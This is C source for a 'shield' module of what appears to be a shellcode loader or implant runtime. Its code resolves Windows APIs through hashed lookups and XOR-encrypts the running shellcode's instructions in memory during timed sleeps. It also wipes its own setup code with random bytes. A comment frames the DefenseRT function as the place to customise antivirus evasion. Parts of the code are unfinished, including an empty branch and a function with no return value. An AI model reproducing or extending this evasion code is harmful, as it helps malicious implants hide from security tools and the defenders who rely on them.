#include "c_types.h"
#include "win_types.h"
#include "dll_kernel32.h"
#include "lib_memory.h"
#include "rel_addr.h"
#include "hash_api.h"
#include "random.h"
#include "crypto.h"
#include "errno.h"
#include "context.h"
#include "layout.h"
#include "shield.h"
#include "debug.h"

#define METHOD_SLEEP 1
#define METHOD_STOP  2

typedef struct {
    uintptr Method;

    VirtualProtect_t      VirtualProtect;
    WaitForSingleObject_t WaitForSingleObject;
    uintptr               Reserved;

    void* CriticalAddr;
    uint  CriticalSize;
    void* DecoyAddr;
    uint  DecoySize;

    void*  Shelter;
    HANDLE hTimer;
} Sleep_Args;

typedef struct {
    uintptr Method;

    VirtualProtect_t VirtualProtect;
    VirtualFree_t    VirtualFree;
    ExitThread_t     ExitThread;

    void* CriticalAddr;
    uint  CriticalSize;
    void* DecoyAddr;
    uint  DecoySize;
} Stop_Args;

typedef struct {
    // store options
    bool NotEraseInstruction;
    bool NotAdjustProtect;

    VirtualAlloc_t         VirtualAlloc;
    VirtualFree_t          VirtualFree;
    VirtualProtect_t       VirtualProtect;
    ExitThread_t           ExitThread;
    CreateWaitableTimerA_t CreateWaitableTimerA;
    SetWaitableTimer_t     SetWaitableTimer;
    WaitForSingleObject_t  WaitForSingleObject;
    CloseHandle_t          CloseHandle;

    // shield entry point
    void* entry;

    // allocated shield address
    void* page;

    SD_Status status;
} Shield;

// methods for user
BOOL SD_GetStatus(SD_Status* status);

// methods for runtime
void  SD_Sleep(DWORD dwMilliseconds);
void  SD_Stop();
errno SD_Clean();

// hard encoded address in getShieldPointer for replacement
#ifdef _WIN64
    #define SHIELD_POINTER 0x7FABCDEF111111FF
#elif _WIN32
    #define SHIELD_POINTER 0x7FABCDFF
#endif
static Shield* getShieldPointer();

static bool initShieldAPI(Shield* shield, Context* context);
static bool updateShieldPointer(Shield* shield);
static bool recoverShieldPointer(Shield* shield);
static bool initShieldEnvironment(Shield* shield, Context* context);
static void eraseShieldMethods(Context* context);
static void cleanShield(Shield* shield);

Shield_M* InitShield(Context* context)
{
    // set structure address
    uintptr addr = context->MainMemPage;
    uintptr shieldAddr = addr + LAYOUT_SD_STRUCT + RandUintN(addr, 128);
    uintptr methodAddr = addr + LAYOUT_SD_METHOD + RandUintN(addr, 128);
    // allocate shield memory
    Shield* shield = (Shield*)shieldAddr;
    mem_init(shield, sizeof(Shield));
    // store options
    shield->NotEraseInstruction = context->NotEraseInstruction;
    shield->NotAdjustProtect    = context->NotAdjustProtect;
    // initialize shield
    errno errno = NO_ERROR;
    for (;;)
    {
        if (!initShieldAPI(shield, context))
        {
            errno = ERR_SHIELD_INIT_API;
            break;
        }
        if (!updateShieldPointer(shield))
        {
            errno = ERR_SHIELD_UPDATE_PTR;
            break;
        }
        if (!initShieldEnvironment(shield, context))
        {
            errno = ERR_SHIELD_INIT_ENV;
            break;
        }
        break;
    }
    eraseShieldMethods(context);
    if (errno != NO_ERROR)
    {
        SetLastErrno(errno);
        return NULL;
    }
    // create methods for shield
    Shield_M* method = (Shield_M*)methodAddr;
    // methods for user
    method->GetStatus = GetFuncAddr(&SD_GetStatus);
    // methods for runtime
    method->Sleep  = GetFuncAddr(&SD_Sleep);
    method->Stop   = GetFuncAddr(&SD_Stop);
    method->Clean  = GetFuncAddr(&SD_Clean);
    return method;
}

__declspec(noinline)
static bool initShieldAPI(Shield* shield, Context* context)
{
    // copy from context
    shield->VirtualAlloc         = context->VirtualAlloc;
    shield->CreateWaitableTimerA = context->CreateWaitableTimerA;  
    shield->SetWaitableTimer     = context->SetWaitableTimer;
    shield->CloseHandle          = context->CloseHandle;

    // if the shield stub is NOT pre-injected, use copy from context
    if (context->ShieldModuleHash == 0)
    {
        shield->VirtualFree         = context->VirtualFree;
        shield->VirtualProtect      = context->VirtualProtect;
        shield->ExitThread          = context->ExitThread;
        shield->WaitForSingleObject = context->WaitForSingleObject;
        return true;
    }

    // get original API address
    typedef struct { 
        uint mHash; uint pHash; uint hKey; void* proc;
    } winapi;
    winapi list[] =
#ifdef _WIN64
    {
        { 0xB81CFE7E68817EBC, 0x9ED80CDB7C8DC7CB, 0x93DEFC8B369AEB09 }, // VirtualFree
        { 0x09DCD4916EAF02FB, 0x07847A7F31B555AA, 0xE8CD656DB309997E }, // VirtualProtect
        { 0xB7A6984C86379802, 0x47310D64BDB74A5A, 0xB770E3DCC3F639EF }, // ExitThread
        { 0xBF4577A186DA850B, 0x7084089B2EECD03E, 0x859DED82D1FEBB27 }, // WaitForSingleObject
    };
#elif _WIN32
    {
        { 0xC80B8735, 0x6E1ADA58, 0xF607BBCE }, // VirtualFree
        { 0x10AA34C4, 0xC5560D17, 0xB641E477 }, // VirtualProtect
        { 0x88FF610F, 0xCE1AB90A, 0x1CA2C5D8 }, // ExitThread
        { 0xEE6856BE, 0xB1FF31C3, 0xA11C1DDA }, // WaitForSingleObject
    };
#endif
    for (int i = 0; i < arrlen(list); i++)
    {
        winapi item = list[i];
        void*  proc = FindAPI(item.mHash, item.pHash, item.hKey);
        if (proc == NULL)
        {
            return false;
        }
        list[i].proc = proc;
    }
    shield->VirtualFree         = list[0x00].proc;
    shield->VirtualProtect      = list[0x01].proc;
    shield->ExitThread          = list[0x02].proc;
    shield->WaitForSingleObject = list[0x03].proc;
    return true;
}

// CANNOT merge updateShieldPointer and recoverShieldPointer
// to one function with two arguments, otherwise the compiler
// will generate the incorrect instructions.

__declspec(noinline)
static bool updateShieldPointer(Shield* shield)
{
    bool success = false;
    uintptr target = (uintptr)(GetFuncAddr(&getShieldPointer));
    for (uintptr i = 0; i < 64; i++)
    {
        uintptr* pointer = (uintptr*)(target);
        if (*pointer != SHIELD_POINTER)
        {
            target++;
            continue;
        }
        *pointer = (uintptr)shield;
        success = true;
        break;
    }
    return success;
}

__declspec(noinline)
static bool recoverShieldPointer(Shield* shield)
{
    bool success = false;
    uintptr target = (uintptr)(GetFuncAddr(&getShieldPointer));
    for (uintptr i = 0; i < 64; i++)
    {
        uintptr* pointer = (uintptr*)(target);
        if (*pointer != (uintptr)shield)
        {
            target++;
            continue;
        }
        *pointer = SHIELD_POINTER;
        success = true;
        break;
    }
    return success;
}

static bool initShieldEnvironment(Shield* shield, Context* context)
{
    uintptr stub = (uintptr)(GetFuncAddr(&Shield_Stub));
    // check shield stub is valid
    if (*(byte*)(stub) != SHIELD_STUB_MAGIC)
    {
        return false;
    }
    // prepare xor key
    byte*  key = (byte*)(stub + 1);
    uint16 off = 1 + SHIELD_KEY_SIZE;
    // decrypt shield
    uint16 size = *(uint16*)(stub + off);
    off += sizeof(uint16);
    byte* shield = (byte*)(stub + off);
    XORBuf(shield, size, key, SHIELD_KEY_SIZE);
    off += size;
    // decrypt decoy
    size = *(uint16*)(stub + off);
    off += sizeof(uint16);
    byte* decoy = (byte*)(stub + off);
    XORBuf(decoy, size, key, SHIELD_KEY_SIZE);

    if (context->ShieldModuleHash != 0)
    {

    }
}

static void eraseShieldMethods(Context* context)
{
    if (context->NotEraseInstruction)
    {
        return;
    }
    uintptr begin = (uintptr)(GetFuncAddr(&initShieldAPI));
    uintptr end   = (uintptr)(GetFuncAddr(&eraseShieldMethods));
    uintptr size  = end - begin;
    RandBuffer((byte*)begin, (int64)size);
}

static void cleanShield(Shield* shield)
{

}


// Only the instructions related to the DefenseRT function are
// in plain text during Sleep, so if you need to advance AV, 
// you only need to customize this function.

#define XOR_KEY_SIZE 256

void xorInstructions(Shield_Ctx* ctx, byte* key);

__declspec(noinline)
bool DefenseRT(Shield_Ctx* ctx)
{
    // TODO remove it
    ctx->EndAddress = (uintptr)(GetFuncAddr(&DefenseRT));
    // hide runtime(or with shellcode) instructions
    xorInstructions(ctx, ctx->CryptoKey);
    // simulate kernel32.Sleep()
    bool ok = ctx->WaitForSingleObject(ctx->hTimer, INFINITE) == WAIT_OBJECT_0;
    // recover runtime(or with shellcode) instructions
    xorInstructions(ctx, ctx->CryptoKey);
    return ok;
}

void xorInstructions(Shield_Ctx* ctx, byte* key)
{
    // calculate shellcode position
    uintptr beginAddr = ctx->BeginAddress;
    uintptr endAddr   = ctx->EndAddress;
    // hide runtime(or with shellcode) instructions
    byte keyIdx = 0;
    for (uintptr addr = beginAddr; addr < endAddr; addr++)
    {
        byte* data = (byte*)addr;
        byte k = key[keyIdx];
        *data ^= k;
        // select key
        keyIdx = k+1;
    }
}
